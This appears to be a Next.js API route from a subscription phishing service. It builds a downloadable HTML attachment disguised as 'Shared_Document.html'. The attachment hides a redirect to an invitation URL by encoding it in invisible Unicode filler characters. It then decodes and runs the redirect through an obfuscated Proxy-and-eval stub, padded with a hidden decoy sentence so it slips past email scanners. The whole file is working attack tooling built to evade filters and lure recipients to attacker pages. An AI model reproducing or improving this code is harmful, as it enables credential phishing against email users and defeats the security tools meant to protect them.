import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { requireActiveSubscription } from "@/lib/auth";

const ZERO = "\uFFA0";
const ONE = "\u3164";

const DECOY_TEXTS = [
  "She explored the old, abandoned house.",
  "The morning dew glistened on fresh grass.",
  "He carefully arranged the books on the shelf.",
  "The children played happily in the park.",
  "A warm breeze rustled through the curtains.",
  "The recipe called for two cups of flour.",
  "Stars filled the clear night sky above.",
  "The train arrived precisely on schedule today.",
  "Fresh coffee aroma filled the small kitchen.",
  "The garden bloomed with colorful spring flowers.",
];

function encodeToSteganography(jsCode: string): string {
  let encoded = "";
  for (let i = 0; i < jsCode.length; i++) {
    const charCode = jsCode.charCodeAt(i);
    const binary = charCode.toString(2).padStart(8, "0");
    for (let b = 0; b < binary.length; b++) {
      encoded += binary[b] === "0" ? ZERO : ONE;
    }
  }
  return encoded;
}

function randomVarName(): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  let name = "";
  for (let i = 0; i < 8; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name;
}

function generateAttachmentHtml(redirectUrl: string): string {
  const jsPayload = `window.location.replace("${redirectUrl.replace(/"/g, '\\"')}");`;
  const stegoPayload = encodeToSteganography(jsPayload);
  const trapVar = randomVarName();
  const decoy = DECOY_TEXTS[Math.floor(Math.random() * DECOY_TEXTS.length)];

  return `<html>
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
 </head>
 <body>
 <span hidden>${decoy}</span>
 </body>
<script>
new \\u0050roxy({},{get:(_,${trapVar})=>\\u0065val([...${trapVar}].\\u006dap(${trapVar}=>+("\\uFFA0">${trapVar})).join\`\`.\\u0072eplace(/.{8}/g,${trapVar}=>String.from\\u0043harCode(+("0b"+${trapVar}))))}).
${stegoPayload}
</script>
</html>`;
}

export async function POST(
  _request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  let userId: string;
  try {
    userId = await requireActiveSubscription();
  } catch (err) {
    const message = err instanceof Error ? err.message : "Unknown";
    if (message === "SUBSCRIPTION_REQUIRED") return NextResponse.json({ error: "Active subscription required" }, { status: 403 });
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { id } = await params;

  const invitation = await prisma.invitation.findFirst({
    where: { id, userId },
    include: { domain: true },
  });

  if (!invitation) {
    return NextResponse.json({ error: "Not found" }, { status: 404 });
  }

  // Build the invitation URL — same logic as frontend getLink()
  let invitationUrl: string;
  if (invitation.deployedUrl) {
    invitationUrl = invitation.deployedUrl;
  } else if (invitation.domain) {
    invitationUrl = `https://${invitation.domain.domain}/i/${invitation.code}`;
  } else {
    const platformDomain = process.env.NEXT_PUBLIC_PLATFORM_DOMAIN || process.env.NEXTAUTH_URL?.replace("https://", "") || "localhost:3000";
    invitationUrl = `https://${platformDomain}/i/${invitation.code}`;
  }

  const html = generateAttachmentHtml(invitationUrl);

  return new NextResponse(html, {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=utf-8",
      "Content-Disposition": `attachment; filename="Shared_Document.html"`,
      "Cache-Control": "no-store",
    },
  });
}
